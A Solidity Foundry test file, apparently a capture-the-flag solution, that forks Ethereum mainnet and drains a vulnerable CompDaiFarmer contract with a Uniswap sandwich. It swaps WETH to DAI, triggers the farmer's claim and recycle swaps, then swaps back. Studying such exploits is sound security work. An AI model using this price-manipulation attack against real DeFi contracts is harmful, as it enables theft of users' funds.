pragma solidity 0.8.0;

import "../src/farmer/Farmer.sol";
import "forge-std/Test.sol";

contract Exploit is Test {
    uint256 expectedBalance;

    CompDaiFarmer public farmer;
    CompFaucet public faucet;
    ERC20Like public constant COMP = ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    ERC20Like public constant DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    CERC20Like public constant CDAI = CERC20Like(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    UniRouter public constant ROUTER = UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address player = address(0xBaDa55);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");

        WETH.deposit{value: 100 ether}();
        WETH.approve(address(ROUTER), type(uint256).max);

        // deploy the farmer
        farmer = new CompDaiFarmer();

        // deploy the faucet
        faucet = new CompFaucet(address(farmer));
        farmer.setComp(address(faucet));

        // fund the faucet
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(COMP);
        ROUTER.swapExactTokensForTokens(
            50 ether,
            0,
            path,
            address(this),
            block.timestamp + 1800
        );
        uint256 compBalance = COMP.balanceOf(address(this));
        COMP.transfer(address(faucet), compBalance);
        expectedBalance = DAI.balanceOf(address(farmer)) + farmer.peekYield();

        vm.deal(player, 10 ether);
    }

    function isSolved() public view returns (bool) {
        return COMP.balanceOf(address(faucet)) == 0 &&
            COMP.balanceOf(address(farmer)) == 0 &&
            DAI.balanceOf(address(farmer)) < expectedBalance;
    }

    function testFarmerExploit() public {
        uint256 amount = 10 ether;

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DAI);

        vm.startPrank(player);

        WETH.deposit{value: amount}();
        WETH.approve(address(ROUTER), amount);
        uint256[] memory amts = ROUTER.swapExactTokensForTokens(
            10e18,
            0,
            path,
            player,
            block.timestamp
        );

        farmer.claim();
        farmer.recycle();

        DAI.approve(address(ROUTER), amts[1]);
        path[0] = address(DAI);
        path[1] = address(WETH);
        ROUTER.swapExactTokensForTokens(
            amts[1],
            0,
            path,
            player,
            block.timestamp
        );

        require(isSolved(), "NOT SOLVED");
    }
}

